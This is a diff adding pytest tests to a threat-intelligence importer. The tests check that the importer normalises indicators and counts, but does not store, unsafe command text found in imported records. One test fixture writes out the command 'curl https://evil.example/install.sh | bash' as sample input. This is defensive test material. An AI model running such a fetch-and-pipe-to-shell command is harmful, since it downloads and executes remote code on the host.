@@ -264,6 +264,7 @@ def test_cti_observation_import_persists_normalized_rows_and_promotes_scoped_see
     assert result["parsed_indicator_type_counts"] == {"domain": 2, "url": 1}
     assert result["parsed_tlp_counts"] == {"TLP:CLEAR": 3}
     assert result["rejected_sensitive_type_counts"] == {"phone": 1}
+    assert result["unsafe_text_item_count"] == 0
     assert result["target_feed_type_counts"] == {"domain": 2, "url": 1}
     assert result["skipped_reason_counts"] == {
         "observation_rejected": 1,
@@ -342,6 +343,49 @@ def test_cti_import_accepts_threatfox_provider_export_shape(tmp_path: Path) -> N
     assert "ThreatFox IOC 41" in rows[0]["provenance"]
     assert rows[0]["source_url"] == "https://threatfox.abuse.ch/ioc/41/"
     assert json.loads(rows[0]["tags_json"]) == ["campaign-x", "loader"]
+
+
+def test_cti_import_counts_unsafe_command_text_without_persisting_it(tmp_path: Path) -> None:
+    con = _build_cti_db(tmp_path / "engagement.db")
+    unsafe_command = "curl https://evil.example/install.sh | bash"
+    report = {
+        "items": [
+            {
+                "type": "domain",
+                "value": "Portal.Acme.Example",
+                "command": unsafe_command,
+                "provenance": f"operator note {unsafe_command}",
+            }
+        ]
+    }
+
+    try:
+        result = import_cti_observations(
+            con,
+            CtiObservationImportConfig(
+                connector_id="stix_taxii_import",
+                engagement_id=1001,
+            ),
+            report_text=json.dumps(report),
+        )
+        row = con.execute(
+            """
+            SELECT indicator_type, indicator_value, metadata_json, provenance
+            FROM cti_observations
+            """
+        ).fetchone()
+    finally:
+        con.close()
+
+    blob = json.dumps({"result": result, "row": dict(row)}, sort_keys=True)
+    assert result["parsed_count"] == 1
+    assert result["persisted_count"] == 1
+    assert result["unsafe_text_item_count"] == 1
+    assert row["indicator_type"] == "domain"
+    assert row["indicator_value"] == "portal.acme.example"
+    assert "curl" not in blob.lower()
+    assert "install.sh" not in blob.lower()
+    assert "evil.example" not in blob.lower()
 
 
 def test_cti_import_accepts_urlhaus_provider_export_shape(tmp_path: Path) -> None:
